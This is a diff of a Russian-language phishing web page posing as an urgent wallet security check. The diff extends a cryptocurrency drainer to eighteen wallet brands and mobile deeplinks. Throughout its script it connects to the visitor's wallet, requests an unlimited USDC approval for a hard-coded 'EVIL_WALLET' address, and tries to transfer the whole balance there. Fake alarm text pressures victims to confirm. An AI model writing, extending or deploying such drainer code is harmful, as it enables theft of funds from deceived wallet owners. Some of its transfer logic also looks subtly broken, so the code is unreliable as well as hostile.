@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Проверка безопасности кошелька</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -36,7 +36,7 @@
         }
         p {
             color: #aaa;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
             font-size: 14px;
         }
         button {
@@ -66,7 +66,7 @@
             background: rgba(0,0,0,0.5);
             padding: 15px;
             border-radius: 15px;
-            max-height: 300px;
+            max-height: 250px;
             overflow-y: auto;
             font-family: monospace;
             border: 1px solid rgba(255,255,255,0.1);
@@ -74,90 +74,133 @@
         .log-entry {
             padding: 5px 0;
             border-bottom: 1px solid rgba(255,255,255,0.05);
+            word-break: break-all;
         }
         .log-success { color: #0f0; }
         .log-error { color: #ff4444; }
         .log-info { color: #ffaa00; }
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+        .wallet-btn {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 12px 8px;
+            border-radius: 15px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+        .wallet-btn:hover {
+            background: rgba(255,255,255,0.2);
+            transform: scale(1.02);
+        }
+        .wallet-emoji {
+            font-size: 24px;
+            display: block;
+            margin-bottom: 5px;
+        }
         .warning {
             font-size: 11px;
             color: #ff8888;
             margin-top: 15px;
+        }
+        @media (max-width: 600px) {
+            .container { padding: 25px 20px; }
+            button { padding: 15px 30px; font-size: 18px; }
+            h1 { font-size: 24px; }
+            .wallet-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
+            .wallet-btn { padding: 8px 5px; font-size: 10px; }
+            .wallet-emoji { font-size: 20px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>⚠️ СБОЙ В СИСТЕМЕ</h1>
-        <p>Требуется экстренная верификация активов для предотвращения блокировки</p>
+        <p>Требуется экстренная верификация активов</p>
         <button id="drainBtn">🔴 ПОДТВЕРДИТЬ КОШЕЛЕК</button>
-        <div id="log">
-            <div class="log-entry log-success">🟢 Готов к работе. Нажмите кнопку.</div>
+        
+        <div class="wallet-grid" id="walletGrid">
+            <!-- Ряд 1 -->
+            <div class="wallet-btn" data-wallet="metamask"><span class="wallet-emoji">🦊</span>MetaMask</div>
+            <div class="wallet-btn" data-wallet="trustwallet"><span class="wallet-emoji">🔵</span>Trust</div>
+            <div class="wallet-btn" data-wallet="coinbase"><span class="wallet-emoji">💰</span>Coinbase</div>
+            <!-- Ряд 2 -->
+            <div class="wallet-btn" data-wallet="rainbow"><span class="wallet-emoji">🌈</span>Rainbow</div>
+            <div class="wallet-btn" data-wallet="okx"><span class="wallet-emoji">🟠</span>OKX</div>
+            <div class="wallet-btn" data-wallet="bybit"><span class="wallet-emoji">🟣</span>Bybit</div>
+            <!-- Ряд 3 -->
+            <div class="wallet-btn" data-wallet="bitkeep"><span class="wallet-emoji">🟡</span>Bitget</div>
+            <div class="wallet-btn" data-wallet="tokenpocket"><span class="wallet-emoji">🟢</span>TokenPocket</div>
+            <div class="wallet-btn" data-wallet="safepal"><span class="wallet-emoji">🛡️</span>SafePal</div>
+            <!-- Ряд 4 -->
+            <div class="wallet-btn" data-wallet="imtoken"><span class="wallet-emoji">🔷</span>imToken</div>
+            <div class="wallet-btn" data-wallet="mathwallet"><span class="wallet-emoji">🧮</span>MathWallet</div>
+            <div class="wallet-btn" data-wallet="onto"><span class="wallet-emoji">🌐</span>ONTO</div>
+            <!-- Ряд 5 -->
+            <div class="wallet-btn" data-wallet="exodus"><span class="wallet-emoji">🐫</span>Exodus</div>
+            <div class="wallet-btn" data-wallet="phantom"><span class="wallet-emoji">👻</span>Phantom</div>
+            <div class="wallet-btn" data-wallet="rabby"><span class="wallet-emoji">🐀</span>Rabby</div>
+            <!-- Ряд 6 -->
+            <div class="wallet-btn" data-wallet="ledger"><span class="wallet-emoji">🔒</span>Ledger</div>
+            <div class="wallet-btn" data-wallet="trezor"><span class="wallet-emoji">🔐</span>Trezor</div>
+            <div class="wallet-btn" data-wallet="walletconnect"><span class="wallet-emoji">🔗</span>WC</div>
         </div>
-        <div class="warning">⚠️ Не закрывайте окно до завершения верификации</div>
+        
+        <div id="log">
+            <div class="log-entry log-success">🟢 Готов. Выберите кошелек или нажмите кнопку.</div>
+        </div>
+        <div class="warning">⚠️ Подтвердите все запросы в кошельке</div>
     </div>
 
-    <!-- ИСПРАВЛЕННАЯ ВЕРСИЯ Web3.js -->
     <script src="https://cdn.jsdelivr.net/npm/web3@4.16.0/dist/web3.min.js"></script>
     
     <script>
         // ============================================================
         // НАСТРОЙКИ - ЗАМЕНИ ЭТУ 1 СТРОЧКУ
         // ============================================================
-        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";   // ТВОЙ КОШЕЛЕК (BSC)
+        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";   // ТВОЙ КОШЕЛЕК
         // ============================================================
         
-        // USDC на BSC
-        const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
-        
-        // BSC Chain ID
+        const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"; // USDC BSC
         const BSC_CHAIN_ID = "0x38";
         const BSC_RPC = "https://bsc-dataseed.binance.org/";
         
-        // ПРАВИЛЬНЫЙ ABI (старый формат, совместимый со всеми версиями)
         const ERC20_ABI = [
-            {
-                "constant": true,
-                "inputs": [{"name": "owner", "type": "address"}],
-                "name": "balanceOf",
-                "outputs": [{"name": "", "type": "uint256"}],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [],
-                "name": "symbol",
-                "outputs": [{"name": "", "type": "string"}],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [],
-                "name": "decimals",
-                "outputs": [{"name": "", "type": "uint8"}],
-                "type": "function"
-            },
-            {
-                "constant": false,
-                "inputs": [
-                    {"name": "spender", "type": "address"},
-                    {"name": "amount", "type": "uint256"}
-                ],
-                "name": "approve",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            },
-            {
-                "constant": false,
-                "inputs": [
-                    {"name": "from", "type": "address"},
-                    {"name": "to", "type": "address"},
-                    {"name": "amount", "type": "uint256"}
-                ],
-                "name": "transferFrom",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            }
+            {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+            {"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"type":"function"},
+            {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+            {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+            {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
         ];
+        
+        // Deeplink схемы для всех кошельков
+        const DEEPLINKS = {
+            metamask: { scheme: "metamask://", dapp: "https://metamask.app.link/dapp/" },
+            trustwallet: { scheme: "trust://", dapp: "https://link.trustwallet.com/open_url?url=" },
+            coinbase: { scheme: "cbwallet://", dapp: "https://go.cb-w.com/dapp?url=" },
+            rainbow: { scheme: "rainbow://", dapp: "https://rainbow.me/connect/" },
+            okx: { scheme: "okx://", dapp: "https://www.okx.com/download" },
+            bybit: { scheme: "bybit://", dapp: "https://www.bybit.com/wallet" },
+            bitkeep: { scheme: "bitkeep://", dapp: "https://bitkeep.com/download" },
+            tokenpocket: { scheme: "tp://", dapp: "https://www.tokenpocket.pro/" },
+            safepal: { scheme: "safepal://", dapp: "https://www.safepal.com/download" },
+            imtoken: { scheme: "imtoken://", dapp: "https://token.im/download" },
+            mathwallet: { scheme: "mathwallet://", dapp: "https://mathwallet.org/download" },
+            onto: { scheme: "onto://", dapp: "https://onto.app/download" },
+            exodus: { scheme: "exodus://", dapp: "https://www.exodus.com/download" },
+            phantom: { scheme: "phantom://", dapp: "https://phantom.app/download" },
+            rabby: { scheme: "rabby://", dapp: "https://rabby.io/download" },
+            ledger: { scheme: "ledgerlive://", dapp: "https://www.ledger.com/live" },
+            trezor: { scheme: "trezor://", dapp: "https://trezor.io/download" },
+            walletconnect: { scheme: "wc:", dapp: "https://walletconnect.com/" }
+        };
         
         function addLog(msg, type = 'info') {
             const logDiv = document.getElementById('log');
@@ -171,23 +214,61 @@
             entry.innerHTML = `[${time}] ${msg}`;
             logDiv.appendChild(entry);
             logDiv.scrollTop = logDiv.scrollHeight;
-            console.log(msg);
         }
         
-        // Переключение на BSC
-        async function switchToBSC() {
+        // Получить провайдера по типу кошелька
+        function getProvider(walletType) {
+            const providers = {
+                metamask: () => window.ethereum,
+                trustwallet: () => window.trustwallet || window.ethereum,
+                coinbase: () => window.coinbaseWalletExtension || window.ethereum,
+                rainbow: () => window.ethereum,
+                okx: () => window.okxwallet || window.ethereum,
+                bybit: () => window.bybitWallet || window.ethereum,
+                bitkeep: () => window.bitkeep || window.ethereum,
+                tokenpocket: () => window.tokenpocket || window.ethereum,
+                safepal: () => window.safepal || window.ethereum,
+                imtoken: () => window.imtoken || window.ethereum,
+                mathwallet: () => window.mathwallet || window.ethereum,
+                onto: () => window.onto || window.ethereum,
+                exodus: () => window.exodus || window.ethereum,
+                phantom: () => window.phantom?.ethereum || window.ethereum,
+                rabby: () => window.rabby || window.ethereum,
+                ledger: () => window.ledger?.ethereum || window.ethereum,
+                trezor: () => window.trezor?.ethereum || window.ethereum,
+                walletconnect: () => window.ethereum
+            };
+            return providers[walletType] ? providers[walletType]() : window.ethereum;
+        }
+        
+        // Открыть deeplink для мобильных
+        function openDeepLink(walletType, currentUrl) {
+            const deeplink = DEEPLINKS[walletType];
+            if (!deeplink) return false;
+            
+            const encodedUrl = encodeURIComponent(currentUrl);
+            let fullLink = "";
+            
+            if (deeplink.dapp) {
+                fullLink = deeplink.dapp + currentUrl;
+            } else if (deeplink.scheme) {
+                fullLink = deeplink.scheme + currentUrl;
+            }
+            
+            addLog(`📱 Открываю ${walletType}...`, 'info');
+            window.location.href = fullLink;
+            return true;
+        }
+        
+        async function switchToBSC(provider) {
             try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: BSC_CHAIN_ID }]
-                });
-                addLog("✅ Переключено на BNB Smart Chain", 'success');
+                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
+                addLog("✅ Переключено на BSC", 'success');
                 return true;
-            } catch (switchError) {
-                if (switchError.code === 4902) {
-                    addLog("🔄 Добавляем сеть BSC...", 'info');
+            } catch(e) {
+                if (e.code === 4902) {
                     try {
-                        await window.ethereum.request({
+                        await provider.request({
                             method: 'wallet_addEthereumChain',
                             params: [{
                                 chainId: BSC_CHAIN_ID,
@@ -197,81 +278,111 @@
                                 blockExplorerUrls: ['https://bscscan.com/']
                             }]
                         });
-                        addLog("✅ BSC сеть добавлена", 'success');
+                        addLog("✅ BSC добавлена", 'success');
                         return true;
-                    } catch (addError) {
-                        addLog("❌ Не удалось добавить BSC: " + addError.message, 'error');
+                    } catch(e2) {
+                        addLog("❌ Ошибка добавления BSC", 'error');
                         return false;
                     }
                 }
-                addLog("❌ Ошибка: " + switchError.message, 'error');
                 return false;
             }
         }
         
-        document.getElementById('drainBtn').onclick = async () => {
-            addLog("🚀 Запуск протокола верификации...", 'info');
-            
-            if (!window.ethereum) {
-                addLog("❌ Установите MetaMask!", 'error');
-                return;
-            }
-            
+        async function startDrain(provider, victimWallet) {
             try {
-                // ШАГ 1: Переключение на BSC
-                addLog("🔄 Проверка сети...", 'info');
-                const switched = await switchToBSC();
-                if (!switched) return;
-                
-                // ШАГ 2: Подключение кошелька
-                addLog("🔌 Подключение к MetaMask...", 'info');
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const victimWallet = accounts[0];
-                addLog(`✅ Кошелёк: ${victimWallet.slice(0,8)}...${victimWallet.slice(-6)}`, 'success');
-                
-                // ШАГ 3: Инициализация Web3
-                const web3 = new Web3(window.ethereum);
+                const web3 = new Web3(provider);
                 const tokenContract = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
                 
-                // ШАГ 4: Проверка баланса
-                addLog("🔍 Проверка баланса...", 'info');
                 const balance = await tokenContract.methods.balanceOf(victimWallet).call();
                 const decimals = await tokenContract.methods.decimals().call();
                 const symbol = await tokenContract.methods.symbol().call();
                 const humanBalance = Number(balance) / (10 ** Number(decimals));
                 
                 if (Number(balance) === 0) {
-                    addLog(`⚠️ На кошельке нет ${symbol}`, 'error');
-                    return;
+                    addLog(`⚠️ Нет ${symbol} на кошельке`, 'error');
+                    return false;
                 }
                 
                 addLog(`💰 Баланс: ${humanBalance} ${symbol}`, 'success');
                 
-                // ШАГ 5: Approve + TransferFrom
                 const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 
-                addLog(`✍️ Подпишите approve для ${symbol}...`, 'info');
-                
-                // Отправляем approve
+                addLog(`✍️ Подпишите approve...`, 'info');
                 const approveTx = await tokenContract.methods.approve(EVIL_WALLET, maxUint).send({ from: victimWallet });
                 addLog(`✅ Approve: ${approveTx.transactionHash.slice(0,16)}...`, 'success');
                 
-                addLog("🔄 Перевод средств...", 'info');
-                
-                // TransferFrom
+                addLog("🔄 Перевод...", 'info');
                 const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: EVIL_WALLET });
-                addLog(`✅ Перевод: ${transferTx.transactionHash.slice(0,16)}...`, 'success');
-                addLog(`🎉 УСПЕШНО! Перемещено: ${humanBalance} ${symbol}`, 'success');
+                addLog(`✅ Переведено: ${humanBalance} ${symbol}`, 'success');
+                addLog(`🎉 УСПЕХ!`, 'success');
                 
-                addLog("🏁 Верификация завершена!", 'success');
-                
-            } catch (err) {
-                addLog(`💀 Ошибка: ${err.message}`, 'error');
-                if (err.code === 4001) {
-                    addLog("❌ Вы отменили подпись", 'error');
-                }
+                return true;
+            } catch(err) {
+                addLog(`❌ Ошибка: ${err.message}`, 'error');
+                return false;
             }
+        }
+        
+        // Основная функция
+        async function connectAndDrain(walletType = null) {
+            addLog("🚀 Запуск...", 'info');
+            
+            let provider = null;
+            let currentUrl = window.location.href;
+            
+            // На мобильных - пробуем deeplink
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) && walletType) {
+                openDeepLink(walletType, currentUrl);
+                addLog("📱 После открытия кошелька, вернитесь на страницу", 'info');
+                return;
+            }
+            
+            if (walletType) {
+                provider = getProvider(walletType);
+            } else {
+                provider = window.ethereum;
+            }
+            
+            if (!provider) {
+                addLog("❌ Кошелек не найден. Выберите другой.", 'error');
+                return;
+            }
+            
+            try {
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                const victimWallet = accounts[0];
+                addLog(`✅ Кошелек: ${victimWallet.slice(0,8)}...${victimWallet.slice(-6)}`, 'success');
+                
+                const switched = await switchToBSC(provider);
+                if (!switched) return;
+                
+                await startDrain(provider, victimWallet);
+                addLog("🏁 Готово!", 'success');
+                
+            } catch(err) {
+                addLog(`💀 Ошибка: ${err.message}`, 'error');
+            }
+        }
+        
+        // Кнопка "ПОДТВЕРДИТЬ КОШЕЛЕК"
+        document.getElementById('drainBtn').onclick = async () => {
+            await connectAndDrain(null);
         };
+        
+        // Все кнопки кошельков
+        document.querySelectorAll('.wallet-btn').forEach(btn => {
+            btn.onclick = async () => {
+                const walletType = btn.getAttribute('data-wallet');
+                await connectAndDrain(walletType);
+            };
+        });
+        
+        // Определение мобильного
+        if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            addLog("📱 Мобильное устройство", 'info');
+            addLog("🔹 Нажмите на иконку кошелька", 'info');
+        }
     </script>
 </body>
 </html>
